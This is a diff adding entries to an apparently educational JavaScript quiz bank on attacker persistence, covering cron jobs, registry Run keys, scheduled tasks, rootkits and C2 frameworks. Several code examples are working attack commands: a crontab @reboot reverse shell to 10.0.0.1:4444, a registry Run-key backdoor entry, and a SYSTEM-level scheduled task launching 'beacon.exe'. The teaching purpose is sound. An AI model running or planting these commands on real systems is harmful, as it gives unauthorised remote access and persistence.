@@ -221,6 +221,46 @@ http-get {
     level: "expert",
     codeExample: `// The Persistence Validation Lifecycle:
 Establish_Stealth_Foothold() → Simulate_C2_Heartbeat() → Validate_EDR_Detection() → CLEANUP_AND_HARDEN_SYSTEMS();`
+  },
+  {
+    question: "What is the primary objective of Phase 4: Maintaining Access in hacking methodologies?",
+    shortAnswer: "To establish reliable, long-term persistence mechanisms so the attacker can re-enter the network even after system reboots, credential resets, or temporary network disconnects.",
+    explanation: "Initial exploits may be ephemeral or patched; attackers install persistent backdoors, scheduled tasks, and secondary admin accounts to preserve their foothold.",
+    hint: "Ensuring persistent access across system reboots and credential resets.",
+    level: "basic",
+    codeExample: "crontab -e -> @reboot /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
+  },
+  {
+    question: "What is a 'Rootkit' and how does a Kernel-mode rootkit differ from a User-mode rootkit?",
+    shortAnswer: "A rootkit is stealth software that hides malicious processes and files from the OS; Kernel-mode rootkits run in Ring 0 modifying kernel tables, while User-mode rootkits operate in Ring 3 intercepting API calls.",
+    explanation: "Kernel rootkits modify System Service Dispatch Tables (SSDT) or Direct Kernel Object Manipulation (DKOM), making them completely invisible to standard antivirus and Task Manager.",
+    hint: "Stealth software hiding processes; Ring 0 kernel level vs Ring 3 user level.",
+    level: "advanced",
+    codeExample: "// DKOM unlinking process from ActiveProcessLinks list to make it invisible in Task Manager"
+  },
+  {
+    question: "How do attackers establish persistence using Windows Registry Run keys?",
+    shortAnswer: "By writing the file path of a payload into registry keys like `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`, executing the malware automatically whenever a user logs in.",
+    explanation: "Run and RunOnce registry keys are among the most common autostart extensibility points (ASEPs) monitored by EDR and Autoruns tools.",
+    hint: "Writing payload paths to the Run registry key to auto-start on user login.",
+    level: "moderate",
+    codeExample: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d 'C:\\Users\\Public\\agent.exe'"
+  },
+  {
+    question: "What are Scheduled Tasks and Cron Jobs in the context of persistence?",
+    shortAnswer: "System utilities configured by attackers to execute payloads at predetermined recurring intervals (e.g. daily at 2:00 AM) or upon system startup with elevated privileges.",
+    explanation: "Scheduled tasks run under the `SYSTEM` account on Windows, providing both persistence and automatic privilege maintenance.",
+    hint: "Configuring Windows Task Scheduler or Linux crontab to run backdoors periodically.",
+    level: "basic",
+    codeExample: "schtasks /create /sc daily /tn 'SystemHealthUpdate' /tr 'C:\\Windows\\Temp\\beacon.exe' /st 03:00 /ru SYSTEM"
+  },
+  {
+    question: "What is a Command and Control (C2) framework and what are popular examples?",
+    shortAnswer: "A centralized software platform used by attackers to manage compromised endpoints (beacons), issue commands, exfiltrate data, and automate lateral movement (e.g. Cobalt Strike, Mythic, Sliver).",
+    explanation: "C2 agents use malleable HTTP/DNS profiles to blend beacon traffic into legitimate enterprise web traffic, evading network anomaly detection.",
+    hint: "Platform managing compromised bots using malleable HTTP/DNS beacon profiles.",
+    level: "advanced",
+    codeExample: "CobaltStrike_Profile: 'Set sleep 60s, jitter 20%, disguising traffic as jQuery.min.js requests'"
   }
 ];
 
